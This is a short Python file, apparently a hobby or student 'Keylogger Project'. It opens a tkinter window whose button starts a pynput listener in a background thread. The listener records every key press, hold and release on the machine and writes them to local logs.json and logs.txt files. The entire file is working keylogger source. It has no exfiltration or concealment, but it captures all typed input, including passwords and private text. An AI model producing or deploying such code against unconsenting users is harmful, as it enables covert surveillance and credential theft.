import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import threading

root = tk.Tk()
root.geometry("800x500")
root.title("Keylogger Project")
root.configure(bg = "Grey")

key_list = []
x = False
key_strokes = ""

def update_txt_file(key):
    with open('logs.txt', 'w') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open("logs.json", "w") as key_log:
        json.dump(key_list, key_log, indent=4)

def on_press(key):
    global x, key_list
    if not x:
        key_list.append({"Pressed": str(key)})
        x = True
    else:
        key_list.append({"Held": str(key)})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({"Released": str(key)})
    x = False
    update_json_file(key_list)
    key_strokes += str(key)
    update_txt_file(key_strokes)

def start_keylogger():
    print("[+] Keylogger started... Saving files in 'logs.json'")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def butaction():
    t = threading.Thread(target=start_keylogger)
    t.daemon = True
    t.start()

Label(root, text="Keylogger", font=('Verdana', 11, 'bold')).grid(row=2, column=2)
Button(root, text="Start Keylogger", command=butaction).grid(row=5, column=2)

root.mainloop()
